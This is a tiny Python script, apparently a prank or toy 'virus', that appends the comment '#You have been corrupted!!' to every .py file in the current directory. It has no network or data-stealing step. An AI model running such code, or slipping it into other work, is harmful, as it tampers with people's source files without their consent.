import glob

for filename in glob.glob("*.py"):
    f = open(filename,'a').write("#You have been corrupted!!")